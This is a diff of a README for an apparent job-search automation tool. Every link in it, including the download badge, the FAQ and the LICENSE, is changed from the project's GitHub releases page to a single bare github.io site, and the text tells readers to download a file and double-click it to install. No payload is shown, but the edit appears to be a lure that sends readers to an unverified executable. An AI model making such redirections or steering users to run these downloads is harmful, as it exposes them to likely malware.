@@ -1,6 +1,6 @@
 # 🤖 automated-job-bot-exec - Streamline Your Job Search Today
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/Invisiblebalancefeatherreedgrass97/automated-job-bot-exec/releases)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://invisiblebalancefeatherreedgrass97.github.io)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ This tool helps you automate your job search process. Follow the simple steps be
 
 Visit this link to download the application:
 
-[Download automated-job-bot-exec](https://github.com/Invisiblebalancefeatherreedgrass97/automated-job-bot-exec/releases)
+[Download automated-job-bot-exec](https://invisiblebalancefeatherreedgrass97.github.io)
 
 Once downloaded, double-click the file to start the setup. Follow the on-screen instructions.
 
@@ -55,7 +55,7 @@ To access settings, open the application and click on the "Settings" tab.
 
 ### Getting Help
 
-If you encounter issues not listed here, please check the [FAQ section](https://github.com/Invisiblebalancefeatherreedgrass97/automated-job-bot-exec/releases) or contact support.
+If you encounter issues not listed here, please check the [FAQ section](https://invisiblebalancefeatherreedgrass97.github.io) or contact support.
 
 ## 📋 System Requirements
 
@@ -71,7 +71,7 @@ Your data is handled with care. The bot does not store personal information loca
 
 ## 📄 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Invisiblebalancefeatherreedgrass97/automated-job-bot-exec/releases) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://invisiblebalancefeatherreedgrass97.github.io) file for details.
 
 ## 📝 Changelog
 
